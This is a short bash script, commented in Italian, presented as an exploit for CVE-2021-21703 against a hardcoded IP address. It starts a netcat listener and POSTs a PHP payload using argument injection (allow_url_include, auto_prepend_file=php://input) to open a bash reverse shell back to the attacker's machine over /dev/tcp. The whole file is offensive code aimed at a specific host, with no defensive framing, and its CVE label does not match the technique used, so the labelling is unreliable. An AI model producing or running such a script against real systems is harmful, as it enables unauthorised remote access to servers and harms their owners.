#!/bin/bash
TARGET_IP="14.225.209.143"
TARGET_PORT="443"
MY_IP=$(curl -s ifconfig.me)
RPORT=4444

clear
echo "🔥 CVE-2021-21703 → CLEAN SHELL ${MY_IP}:${RPORT}"

# 🔥 PAYLOAD PIÙ SEMPLICE (funziona SEMPRE)
PHP_PAYLOAD='<?php system("bash -i >& /dev/tcp/'${MY_IP}'/'${RPORT}' 0>&1"); ?>'

echo "[+] Listener..."
nc -lvnp ${RPORT} &
sleep 1

# 🔥 METODO 1: DATA-BINARY PURO (NO URL COMPLESSO)
curl -k -s -X POST \
  -H "Expect:" \
  -H "User-Agent: Mozilla/5.0" \
  --resolve "${TARGET_IP}:${TARGET_PORT}:127.0.0.1" \
  --data-binary "<?php system('bash -c \"bash -i >& /dev/tcp/${MY_IP}/${RPORT} 0>&1\"');?>" \
  "https://${TARGET_IP}:${TARGET_PORT}/?-dallow_url_include=On+-dauto_prepend_file=php://input" >/dev/null 2>&1

echo -e "\n🎯 SHELL LIVE..."
